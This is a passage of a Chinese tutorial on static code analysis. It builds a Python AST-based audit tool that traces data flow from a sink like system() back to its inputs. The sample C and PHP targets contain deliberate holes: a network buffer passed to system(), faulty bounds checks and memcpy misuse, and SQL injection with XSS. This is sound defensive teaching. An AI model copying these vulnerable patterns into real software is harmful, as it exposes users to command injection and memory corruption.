    function_buffer_resolver-&gt;buffer [label=&quot;Function Argument &quot;,style=bold,color=green,dir=&quot;back&quot;];

    buffer-&gt;command_buffer [label=&quot;memcpy from buffer&quot;,style=bold,color=violet,dir=&quot;back&quot;];

    command_buffer-&gt;function_execute_command [label=&quot;Push data to function argument&quot;,style=bold,color=red,dir=&quot;back&quot;];
    function_execute_command-&gt;command [label=&quot;Function Argument &quot;,style=bold,color=green];

}
</code></pre>
<pre><code class="language-txt">digraph G {

    input_id [shape=box,label=&quot;input_get_id&quot;];
    variant_user_id [label=&quot;variant_user_id&quot;];
    variant_temp_string1 [label=&quot;variant_temp_string1&quot;];
    variant_temp_string2 [label=&quot;variant_temp_string2&quot;];
    function_sql_query [shape=box,label=&quot;function_sql_query&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];
    function_echo [shape=box,label=&quot;function_echo&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];

    input_id-&gt;variant_user_id [label=&quot;Save data to Variant&quot;,style=bold,color=violet];
    variant_user_id-&gt;variant_temp_string1 [label=&quot;Build SQL Query String&quot;,style=bold,color=violet];
    variant_temp_string1-&gt;function_sql_query [label=&quot;Call Function&quot;,style=bold,color=red];
    variant_user_id-&gt;variant_temp_string2 [label=&quot;Build Echo String&quot;,style=bold,color=violet];
    variant_temp_string2-&gt;function_echo [label=&quot;Call Function&quot;,style=bold,color=red];

}
</code></pre>
<pre><code class="language-txt">digraph G {

    input_id [shape=box,label=&quot;input_get_id&quot;];
    variant_user_id [label=&quot;variant_user_id&quot;];
    variant_temp_string1 [label=&quot;variant_temp_string1&quot;];
    function_sql_query [shape=box,label=&quot;function_sql_query&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];

    input_id-&gt;variant_user_id [label=&quot;Save data to Variant&quot;,style=bold,color=violet,dir=&quot;back&quot;];
    variant_user_id-&gt;variant_temp_string1 [label=&quot;Build SQL Query String&quot;,style=bold,color=violet,dir=&quot;back&quot;];
    variant_temp_string1-&gt;function_sql_query [label=&quot;Call Function&quot;,style=bold,color=red,dir=&quot;back&quot;];

}
</code></pre>
<pre><code class="language-txt">
digraph G {

  function_buffer_resolver[shape=box,label=&quot;function_buffer_resolver&quot;,style=filled,fillcolor=&quot;#ABACBA&quot;];
  basic_block_entry[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_1[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_2[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_3[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_4[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_5[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_6[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  condition_1[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_2[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_3[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_4[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];

  function_buffer_resolver-&gt;basic_block_entry;
  basic_block_entry-&gt;condition_1[label=&quot;2 &lt;= buffer_length&quot;];
  condition_1-&gt;basic_block_1[label=&quot;No&quot;];
  condition_1-&gt;basic_block_2[label=&quot;Yes&quot;];
  basic_block_2-&gt;condition_2[label=&quot;MessageType_Hello == buffer[1]&quot;];
  condition_2-&gt;basic_block_3[label=&quot;Yes&quot;];
  condition_3-&gt;basic_block_4[label=&quot;Yes&quot;];
  condition_4-&gt;basic_block_5[label=&quot;Yes&quot;];
  condition_2-&gt;condition_3[label=&quot;No ,Check MessageType_Execute == buffer[1]&quot;];
  condition_3-&gt;condition_4[label=&quot;No ,Check MessageType_Data == buffer[1]&quot;];
  condition_4-&gt;basic_block_6[label=&quot;No&quot;];
  basic_block_3-&gt;basic_block_6;
  basic_block_4-&gt;basic_block_6;
  basic_block_5-&gt;basic_block_6;

}

</code></pre>
<pre><code class="language-txt">
digraph G {

  user_input[shape=box,style=filled,fillcolor=&quot;#EEEEEE&quot;];
  a[shape=box,style=filled,fillcolor=&quot;#ABACBA&quot;];
  b[shape=box,style=filled,fillcolor=&quot;#ABACBA&quot;];
  basic_block_1[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_2[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_3[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_4[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_5[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  basic_block_6[shape=box,style=filled,fillcolor=&quot;#BCABCA&quot;];
  condition_1[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_2[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_3[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];
  condition_4[shape=diamond,style=filled,fillcolor=&quot;#666666&quot;];

  user_input-&gt;a;
  user_input-&gt;b;
  a-&gt;condition_1;
  b-&gt;condition_1;

  condition_1-&gt;condition_2[label=&quot;Yes&quot;];
  condition_2-&gt;basic_block_1[label=&quot;Yes&quot;];
  condition_2-&gt;basic_block_2[label=&quot;No&quot;];
  condition_1-&gt;condition_3[label=&quot;No&quot;];
  condition_3-&gt;basic_block_3[label=&quot;Yes&quot;];
  condition_3-&gt;condition_4[label=&quot;No&quot;];
  condition_4-&gt;basic_block_4[label=&quot;Yes&quot;];
  condition_4-&gt;basic_block_5[label=&quot;No&quot;];
  basic_block_1-&gt;basic_block_6;
  basic_block_2-&gt;basic_block_6;
  basic_block_3-&gt;basic_block_6;
  basic_block_4-&gt;basic_block_6;
  basic_block_5-&gt;basic_block_6;

}

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="附录二----静态审计工具完整源码-1"><a class="header" href="#附录二----静态审计工具完整源码-1">附录二 -- 静态审计工具完整源码</a></h2>
<pre><code class="language-python">

import json

import cparser


code_emun = '''
enum {
  MessageType_Hello = 0,
  MessageType_Execute,
  MessageType_Data
};
'''

code_execute_command = '''
void execute_command(const unsigned char* command) {
    system(command);
}
'''

code_decrypt_data = '''
void decrypt_data(const unsigned char* data_buffer,unsigned char data_buffer_length) {
    unsigned char* buffer[8] = {0};

    for (unsigned int data_index = 0;data_index &lt; data_buffer_length;++data_index)
        buffer[data_index] = data_buffer[data_index] ^ 0x65;

    printf(&quot;Recv:%s\n&quot;,&amp;buffer);
}
'''

code_buffer_resolver = '''
int buffer_resolver(const unsigned char* buffer) {
    unsigned char buffer_length = buffer[0];

    if (2 &lt;= buffer_length)
        return 0;

    if (MessageType_Hello == buffer[1]) {
        printf(&quot;Hello\n&quot;);
    } else if (MessageType_Execute == buffer[1]) {
        unsigned char* command_buffer = (unsigned char*)malloc(buffer_length - 1);

        memset(&amp;command_buffer,0,buffer_length);
        memcpy(&amp;command_buffer,&amp;buffer[2],buffer_length - 2);

        execute_command(command_buffer);
    } else if (MessageType_Data == buffer[1]) {
        decrypt_data(&amp;buffer[2],buffer_length - 2);
    }

    return 1;
}
'''


def resolver_function_parameter(code_string) :
    code_string = code_string.strip()
    code_block_declare_offset = code_string.find('{')

    if -1 == code_block_declare_offset :
        return False

    try :
        function_declare_string = code_string[ : code_block_declare_offset ].strip()
        function_return_type = function_declare_string.split(' ')[0]
        function_name = function_declare_string.split('(')[0]
        function_name = function_name.split(' ')[1]
        function_parameters_string = function_declare_string.split('(')[1].strip()
        function_parameters_string = function_parameters_string.split(')')[0].strip()
        resolve_function_parameters_list = function_parameters_string.split(',')
        function_parameters_list = []

        for resolve_function_parameters_index in resolve_function_parameters_list :
            function_parameters_list.append({
                'type' : resolve_function_parameters_index[ : resolve_function_parameters_index.rfind(' ') ] ,
                'name' : resolve_function_parameters_index.split(' ')[-1] ,
            })

        return {
            'type' : function_return_type ,
            'name' : function_name ,
            'parameters' : function_parameters_list ,
        }
    except :
        pass

    return False


code_stream = {
    'global_enum' : {
        'code' : cparser.get_func_tree(code_emun) ,
        'declare' : resolver_function_parameter(code_emun) ,
    } ,
    'decrypt_data' : {
        'code' : cparser.get_func_tree(code_decrypt_data) ,
        'declare' : resolver_function_parameter(code_decrypt_data) ,
    } ,
    'execute_command' : {
        'code' : cparser.get_func_tree(code_execute_command) ,
        'declare' : resolver_function_parameter(code_execute_command) ,
    } ,
    'buffer_resolver' : {
        'code' : cparser.get_func_tree(code_buffer_resolver) ,
        'declare' : resolver_function_parameter(code_buffer_resolver) ,
    } ,
}


def get_function_parameters(ast_node) :
    parameters_list = []

    for subnode_index in ast_node.subnode :
        if subnode_index[1].type == 'parallel' :
            parameters_list += get_function_parameters(subnode_index[1])
        elif subnode_index[0] == 'parameters' :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })
        elif subnode_index[0].startswith('exp') :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })

    return parameters_list

def recursive_find_call(ast_node,find_function_name) :
    find_result = []

    for subnode_index in ast_node.subnode :
        if subnode_index[1] == None :
            continue

        if 'function_call' == subnode_index[1].type :
            if find_function_name == '*' or find_function_name == subnode_index[1].value :
                parameters_list = get_function_parameters(subnode_index[1])

                find_result.append((subnode_index,parameters_list))

        find_result += recursive_find_call(subnode_index[1],find_function_name)

    return find_result

def print_search_result(call_list) :
    for call_index in call_list :
        ast_node_info = call_index[0]
        parameters_info = call_index[1]

        print 'Call Function Name :',ast_node_info[1].value
        print '  Function Argument :',parameters_info

def resolve_strategy(user_search_strategy) :
    user_search_strategy = user_search_strategy.split('\n')
    check_strategy = []

    for user_search_strategy_index in user_search_strategy :
        strategy_record = user_search_strategy_index.strip()

        if not len(strategy_record) :
            continue

        search_function_name = strategy_record.split('(')[0].strip()
        search_parameter_string = strategy_record.split('(')[1].strip()
        search_parameter_string = search_parameter_string.split(')')[0].strip()
        search_parameter_list = []

        if len(search_parameter_string) :
            if not -1 == search_parameter_string.find(',') :
                search_parameter_string = search_parameter_string.split(',')
                parameter_index = -1

                for search_parameter_index in search_parameter_string :
                    check_parameter = search_parameter_index.strip()
                    parameter_index += 1

                    if not check_parameter == '*' :
                        continue

                    search_parameter_list.append(parameter_index)
            else :
                check_parameter = search_parameter_string.strip()

                if check_parameter == '*' :
                    search_parameter_list.append(0)

        check_strategy.append((search_function_name,search_parameter_list))

    return check_strategy

def search_call_by_strategy(search_strategy,code_object) :
    search_strategy = resolve_strategy(search_strategy)
    search_record = {}

    for search_strategy_index in search_strategy :  #  Search Call by Strategy
        find_function_name = search_strategy_index[0]
        search_check_parameter_list = search_strategy_index[1]
        find_function_call = recursive_find_call(code_object,find_function_name)
        search_record_list = []

        print_search_result(find_function_call)

        for call_index in find_function_call :  #  Find Match Strategy Call
            ast_node_info = call_index[0]
            parameters_list = call_index[1]

            if search_check_parameter_list :
                check_parameter_list = []

                for search_check_parameter_index in search_check_parameter_list :  #  Filter Call Argument
                    if len(parameters_list) &lt;= search_check_parameter_index :
                        continue

                    target_search_parameter = parameters_list[search_check_parameter_index]

                    if not target_search_parameter['type'] in ['variable','address_of'] :  #  Check this Argument is a Variant ..
                        continue

                    check_parameter_list.append(target_search_parameter)

                if check_parameter_list :
                    search_record_list.append((ast_node_info,check_parameter_list))
            else :
                search_record_list.append((ast_node_info,[]))

        if search_record_list :
            search_record[find_function_name] = search_record_list

    return search_record


def xref_variant(trance_record,bingo_parameter_name,function_declare) :
    xref_record = []

    for trance_record_index in trance_record[ :: -1 ] :
        if trance_record_index[1].type in ['get_element','assign'] :
            if bingo_parameter_name in trance_record_index[1].value :
                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })
        elif trance_record_index[1].type == 'function_call' :
            function_parameters = get_function_parameters(trance_record_index[1])

            for function_parameter_index in function_parameters :
                if not bingo_parameter_name in function_parameter_index['value'] :
                    continue

                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })

    for function_parameter_index in function_declare['parameters'] :
        function_parameter_name = function_parameter_index['name']

        if not bingo_parameter_name == function_parameter_name :
            continue

        xref_record.append({
            'type' : 'parameter' ,
            'value' : function_parameter_name ,
            'node' : None
        })

    return xref_record

def trance_record_by_ast(start_node,target_node,bingo_parameters,function_declare,trance_record) :
    code_record = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            xref_record_list = []

            for bingo_parameter_index in bingo_parameters :
                xref_record_list.append(xref_variant(trance_record + code_record,bingo_parameter_index['value'],function_declare))

            return (True,xref_record_list)

        code_record.append(node_object_index)

        is_search,sub_data = trance_record_by_ast(node_object_index[1],target_node,bingo_parameters,function_declare,trance_record + code_record)

        if is_search :
            xref_record_list = sub_data

            return (True,xref_record_list)

        sub_code_record = sub_data
        code_record += sub_code_record

    return (False,code_record)

def get_condition(ast_node) :
    for index in ast_node.subnode :
        if 'condition' == index[0] :
            return index[1].value

    return False

def trance_control_flow_by_ast(start_node,target_node,trance_record) :
    code_record = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            all_trance_record = trance_record + code_record
            control_flow_list = []

            for trance_record_index in all_trance_record :
                if trance_record_index[1].type == 'if' :
                    control_flow_list.append(get_condition(trance_record_index[1]))

            return (True,control_flow_list)

        code_record.append(node_object_index)

        is_search,sub_data = trance_control_flow_by_ast(node_object_index[1],target_node,trance_record + code_record)

        if is_search :
            control_flow_record_list = sub_data

            return (True,control_flow_record_list)

    return (False,code_record)

def xref_function(code_stream,search_function_name) :
    search_xref_data = {}

    for function_name in code_stream.keys() :
        function_code = code_stream[function_name]['code']
        search_result = recursive_find_call(function_code,search_function_name)

        if not search_result :
            continue

        xref_record = xref_function(code_stream,function_name)
        search_xref_data[function_name] = {
            'xref' : xref_record ,
            'reference' : search_result ,
        }

    return search_xref_data

def deep_trance(reference_point_list,xref_reference_function_name,current_function_name) :
    trance_record = {}
    #print 'deep_trance  :  ',current_function_name,'-&gt;',xref_reference_function_name

    for reference_point in reference_point_list :
        code_object = code_stream[xref_reference_function_name]['code']
        code_function_declare = code_stream[xref_reference_function_name]['declare']
        reference_point_ast_node = reference_point[0]
        reference_variant_list = reference_point[1]
        control_flow_list = trance_control_flow_by_ast(code_object,reference_point_ast_node,[])[1]
        data_flow_list = trance_record_by_ast(code_object,reference_point_ast_node,reference_variant_list,code_function_declare,[])[1]
        xref_function_list = xref_function(code_stream,xref_reference_function_name)
        xref_record_list = []

        for xref_function_name in xref_function_list.keys() :
            xref_function_object = xref_function_list[xref_function_name]

            xref_record_list.append(deep_trance(xref_function_object['reference'],xref_function_name,xref_reference_function_name))

        trance_record[xref_reference_function_name] = {
            'data_flow' : data_flow_list ,
            'control_flow' : control_flow_list ,
            'xref' : xref_record_list ,
        }

    return trance_record


search_strategy = 'system(*)'
search_record_list = []

for function_name in code_stream.keys() :
    search_record = search_call_by_strategy(search_strategy,code_stream[function_name]['code'])

    #print 'Search Record :',search_record

    if not search_record :
        continue

    search_record_list.append({
        'function_name' : function_name ,
        'record' : search_record ,
    })

for search_record_index in search_record_list :
    xref_reference_function_name = search_record_index['function_name']
    reference_record_list = search_record_index['record']

    for reference_function_name in reference_record_list.keys() :
        reference_point_list = reference_record_list[reference_function_name]

        print 'Xref-Search for',reference_function_name,'deep_trance() Result :'
        print deep_trance(reference_point_list,xref_reference_function_name,reference_function_name)

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="静态代码分析基本原理-1"><a class="header" href="#静态代码分析基本原理-1">静态代码分析基本原理</a></h2>
<p>静态代码分析是基于有源码的情况下根据已有的规则来匹配源码中是否可能存在漏洞.对于漏洞规则,我们一般分为两种情况:二进制语言和脚本解析语言.为什么要这么样来区分呢?这是因为脚本解析语言绝大部分的漏洞是没有过滤用户的输入,使得用户的输入传递到了敏感函数中执行(比如SQL 注入,反序列化,远程命令执行的原理等),有少部分的漏洞是因为语言本身的特性而导致的.但是二进制语言(C/C++/go)除了前面所述的逻辑,最难的一点是计算程序内存区域是否会出现异常情况(也就是二进制漏洞中常见的UaF ,OOB 等),用静态代码分析比较难发现这些隐藏的漏洞.所以我们先从简单的来说起,相信做过PHP 白盒审计的读者们都知道Seay源码审计助手,这个工具的原理就是通过正则表达式在代码文本中匹配相应的规则,然后生成漏洞报告.</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic1.jpeg" alt="" /></p>
<p>Seay源码审计助手只定位到代码调用敏感函数的位置,但是并没有对参数进行相应的校验,比如说对代码<code>include  $Dir . &quot;/test.php&quot;;</code> 的检测,假设<code>$Dir = &quot;/var/www/&quot;;</code> ,审计助手也是依旧识别为可能存在文件包含漏洞,其实<code>$Dir</code> 的值是固定的,只需要跟踪这个值就可以知道它是不可控的变量.</p>
<p>我们再来看一下fortity SCA ,fortify 对项目扫描除了匹配漏洞之外,还会根据程序的逻辑和函数交叉引用来绘制程序时序图表.接下来我们来了解一些静态代码分析的基本原理.</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic2.png" alt="" /></p>
<h3 id="数据流跟踪-1"><a class="header" href="#数据流跟踪-1">数据流跟踪</a></h3>
<p>我们先来一段示例代码:</p>
<pre><code class="language-c">
#include &lt;malloc.h&gt;
#include &lt;memory.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;


enum {
  MessageType_Hello = 0,
  MessageType_Execute,
  MessageType_Data
};

void execute_command(const unsigned char* command) {
    system(command);
}

void decrypt_data(const unsigned char* data_buffer,unsigned char data_buffer_length) {
    unsigned char* buffer[8] = {0};

    for (unsigned int data_index = 0;data_index &lt; data_buffer_length;++data_index)
        buffer[data_index] = data_buffer[data_index] ^ 0x65;

    printf(&quot;Recv:%s\n&quot;,&amp;buffer);
}

int buffer_resolver(const unsigned char* buffer) {
    unsigned char buffer_length = buffer[0];

    if (2 &lt;= buffer_length)
        return 0;

    if (MessageType_Hello == buffer[1]) {
        printf(&quot;Hello\n&quot;);
    } else if (MessageType_Execute == buffer[1]) {
        unsigned char* command_buffer = (unsigned char*)malloc(buffer_length - 1);

        memset(&amp;command_buffer,0,buffer_length);
        memcpy(&amp;command_buffer,&amp;buffer[2],buffer_length - 2);

        execute_command(command_buffer);
    } else if (MessageType_Data == buffer[1]) {
        decrypt_data(&amp;buffer[2],buffer_length - 2);
    }

    return 1;
}

</code></pre>
<p>这是一段简单的解析数据包的示例代码,可以看到入口点<code>buffer_resolver()</code> 函数提供了一个buffer 参数供外部调用,接下来程序逻辑就针对这个buffer 的内容进行解析然后做进一步的处理.数据流跟踪的意义在于,对一个特定的变量或者参数进行数据流分析,找到这个变量或者参数的来源是否为可控的.</p>
<p>我们把<code>buffer_resolver()</code> 的代码抽象成数据流图.</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic3.png" alt="" /></p>
<p>现在我们可以很清楚地了解到<code>buffer_resolver()</code> 中的数据流过程.图表中绿色代表函数的参数输入,紫色线代表读数据,蓝色线代表写数据,红色线是传递该内容到函数中调用,在标注线的内容中也提到了如何操作数据和操作的位置.在我们做白盒分析代码的时候,一般是定位到敏感函数的位置再做数据流分析.上面的数据流图是<strong>从上往下</strong>分析的,但是如果要对敏感函数的参数进行溯源分析,此时就是要构画一个<strong>从下往上</strong>的数据流图分析.我们的规则匹配到<code>execute_command()</code> ,然后从第一个参数开始往上跟踪,可以得到图表如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic4.png" alt="" /></p>
<p>有了这张粗略的从数据流回溯图,我们很容易就能看到<code>execute_command()</code> 的参数受到哪些地方影响.所以,<strong>当我们定位到某个规则的时候,需要找到能够影响参数的内容,就需要从下往上(从敏感参数开始向上搜索)来对数据流进行回溯;当我们从数据输入位置开始搜索它能影响到哪些变量和参数,就需要从上往下(从可控输入开始向下搜索)对数据进行跟踪</strong>.再举个简单的PHP 例子:</p>
<pre><code class="language-php">
&lt;?php

    $user_id = $_GET['id'];

    $user_name = sql_query('SELECT user_name FROM user WHERE uid = ' . $user_id);

    echo 'Hello : ' . $user_name . ' Uid(' . $user_id . ')';

?&gt;

</code></pre>
<p>对$_GET['id'] 进行数据跟踪,可以发现两个漏洞问题:SQL 注入和XSS .</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic5.png" alt="" /></p>
<p>对<code>sql_query()</code> 进行漏洞规则,我们可以看到在拼接字符串阶段直接把<code>$user_id</code> 引入到<code>sql_query()</code> 的参数中.</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic6.png" alt="" /></p>
<p>对echo 的搜索方式也是一样的原理,限于篇幅此处省略.</p>
<p>下面使用Python 来对示例C++ 代码实现分析.用到https://github.com/tscosine/cparser/ 来解析C++ 代码成AST 代码树</p>
<pre><code class="language-python">
import cparser

code = '''
int buffer_resolver(const unsigned char* buffer) {
    unsigned char buffer_length = buffer[0];

    if (2 &lt;= buffer_length)
        return 0;

    if (MessageType_Hello == buffer[1]) {
        printf(&quot;Hello\n&quot;);
    } else if (MessageType_Execute == buffer[1]) {
        unsigned char* command_buffer = (unsigned char*)malloc(buffer_length - 1);

        memset(&amp;command_buffer,0,buffer_length);
        memcpy(&amp;command_buffer,&amp;buffer[2],buffer_length - 2);

        execute_command(command_buffer);
    } else if (MessageType_Data == buffer[1]) {
        decrypt_data(&amp;buffer[2],buffer_length - 2);
    }

    return 1;
}
'''

data = cparser.get_func_tree(code)

data.nprint()

</code></pre>
<p>对应的nprint() 输出效果</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic7.png" alt="" /></p>
<p>我们使用subnode 对象来获取函数下的语句</p>
<pre><code class="language-python">
for subnode_index in data.subnode :
    print subnode_index

</code></pre>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic8.png" alt="" /></p>
<p>接下来我们对AST 树进行递归搜索,遍历所有函数调用查找execute_command 并输出函数参数(注解:解析函数参数的代码也是遍历AST 树,建议调试理解这部分的代码)</p>
<pre><code class="language-python">
def get_function_parameters(ast_node) :
    parameters_list = []

    for subnode_index in ast_node.subnode :
        if subnode_index[1].type == 'parallel' :
            parameters_list += get_function_parameters(subnode_index[1])
        elif subnode_index[0] == 'parameters' :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })
        elif subnode_index[0].startswith('exp') :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })

    return parameters_list

def recursive_find_call(ast_node,find_function_name) :
    find_result = []

    for subnode_index in ast_node.subnode :
        if 'function_call' == subnode_index[1].type :
            if find_function_name == '*' or find_function_name == subnode_index[1].value :
                parameters_list = get_function_parameters(subnode_index[1])

                find_result.append((subnode_index,parameters_list))

        find_result += recursive_find_call(subnode_index[1],find_function_name)

    return find_result

def print_search_result(call_list) :
    for call_index in call_list :
        ast_node_info = call_index[0]
        parameters_info = call_index[1]

        print 'Call Function Name :',ast_node_info[1].value
        print '  Function Argument :',parameters_info


find_function_call = recursive_find_call(data,'execute_command')

print_search_result(find_function_call)

</code></pre>
<p>程序输出如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic9.png" alt="" /></p>
<p>现在已经可以在AST 树中搜索指定的函数调用和对应的参数列表了,然后我们再拓展自定义搜索规则的功能</p>
<pre><code class="language-python">
search_strategy = '''
execute_command(*)
'''

def resolve_strategy(user_search_strategy) :
    user_search_strategy = user_search_strategy.split('\n')
    check_strategy = []

    for user_search_strategy_index in user_search_strategy :
        strategy_record = user_search_strategy_index.strip()

        if not len(strategy_record) :
            continue

        search_function_name = strategy_record.split('(')[0].strip()
        search_parameter_string = strategy_record.split('(')[1].strip()
        search_parameter_string = search_parameter_string.split(')')[0].strip()
        search_parameter_list = []

        if len(search_parameter_string) :
            if not -1 == search_parameter_string.find(',') :
                search_parameter_string = search_parameter_string.split(',')
                parameter_index = -1

                for search_parameter_index in search_parameter_string :
                    check_parameter = search_parameter_index.strip()
                    parameter_index += 1

                    if not check_parameter == '*' :
                        continue

                    search_parameter_list.append(parameter_index)
            else :
                check_parameter = search_parameter_string.strip()

                if check_parameter == '*' :
                    search_parameter_list.append(0)

        check_strategy.append((search_function_name,search_parameter_list))

    return check_strategy

print resolve_strategy(search_strategy)

</code></pre>
<p>自定义匹配策略的规则是:函数名(检测的函数参数),举个例子:比如要我们知道<code>eval()</code> 函数的第一个参数对输入是敏感的,那么就需要对所有调用<code>eval()</code> 函数的第一个参数进行可控检测,对应的规则是<code>eval(*)</code> ;如果要检测<code>call_user_func()</code> ,那么就要检测第一和第二个参数是否可控,对应的策略为<code>call_user_func(*,*)</code> .有了策略解析器之后,我们再来完善漏洞规则匹配功能:</p>
<pre><code class="language-python">
search_strategy = '''
execute_command(*)
'''

search_strategy = resolve_strategy(search_strategy)
search_record = {}

for search_strategy_index in search_strategy :  #  Search Call by Strategy
    find_function_name = search_strategy_index[0]
    search_check_parameter_list = search_strategy_index[1]
    find_function_call = recursive_find_call(data,find_function_name)

    print_search_result(find_function_call)
    search_record[find_function_name] = []

    for call_index in find_function_call :  #  Find Match Strategy Call
        ast_node_info = call_index[0]
        parameters_list = call_index[1]

        if search_check_parameter_list :
            check_parameter_list = []

            for search_check_parameter_index in search_check_parameter_list :  #  Filter Call Argument
                if len(parameters_list) &lt;= search_check_parameter_index :
                    continue

                target_search_parameter = parameters_list[search_check_parameter_index]

                if not target_search_parameter['type'] in ['variable','address_of'] :  #  Check this Argument is a Variant ..
                    continue

                check_parameter_list.append(target_search_parameter)

            if check_parameter_list :
                search_record[find_function_name].append((ast_node_info,check_parameter_list))
        else :
            search_record[find_function_name].append((ast_node_info,[]))


print search_record

</code></pre>
<p>现在可以根据指定的参数来匹配代码中的函数调用了,输出内容如下</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic10.png" alt="" /></p>
<p>修改策略,搜索<code>memcpy()</code> 函数</p>
<pre><code class="language-python">
search_strategy = '''
execute_command(*)
memcpy(,*,)
'''

</code></pre>
<p>搜索结果如下</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic11.png" alt="" /></p>
<p>最后一步就是实现数据流跟踪功能,在此我们只关注variable 和address_of 类型的AST 树节点数据</p>
<pre><code class="language-python">
def xref_variant(trance_record,bingo_parameter_name) :
    xref_record = []

    for trance_record_index in trance_record[ :: -1 ] :
        if trance_record_index[1].type in ['get_element','assign'] :
            if bingo_parameter_name in trance_record_index[1].value :
                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })
        elif trance_record_index[1].type == 'function_call' :
            function_parameters = get_function_parameters(trance_record_index[1])

            for function_parameter_index in function_parameters :
                if not bingo_parameter_name in function_parameter_index['value'] :
                    continue

                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })

    return xref_record

def trance_record_by_ast(start_node,target_node,bingo_parameters,trance_record) :
    code_record = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            xref_record_list = []

            for bingo_parameter_index in bingo_parameters :
                xref_record_list.append(xref_variant(trance_record + code_record,bingo_parameter_index['value']))

            return (True,xref_record_list)

        code_record.append(node_object_index)

        is_search,sub_data = trance_record_by_ast(node_object_index[1],target_node,bingo_parameters,trance_record + code_record)

        if is_search :
            xref_record_list = sub_data

            return (True,xref_record_list)

        sub_code_record = sub_data
        code_record += sub_code_record

    return (False,code_record)


search_strategy = '''
execute_command(*)
'''
search_record = search_call_by_strategy(search_strategy,data)

print 'Search Record :',search_record

for search_record_index in search_record.keys() :
    functinon_name = search_record_index
    bingo_record_list = search_record[search_record_index]

    for bingo_record_index in bingo_record_list :
        print trance_record_by_ast(data,bingo_record_index[0],bingo_record_index[1],[])

</code></pre>
<p>运行效果如下</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic12.png" alt="" /></p>
<p>对数据流的分析需要比较多的递归,笔者在设计PHP 白盒审计工具时(https://github.com/lcatro/PHP_Source_Audit_Tools) 就遇到过性能问题,在几个页面之间做深度数据流分析很容易会产生大量递归和循环,做好数据流跟踪之后,接下来就是控制流分析.</p>
<h3 id="控制流分析-1"><a class="header" href="#控制流分析-1">控制流分析</a></h3>
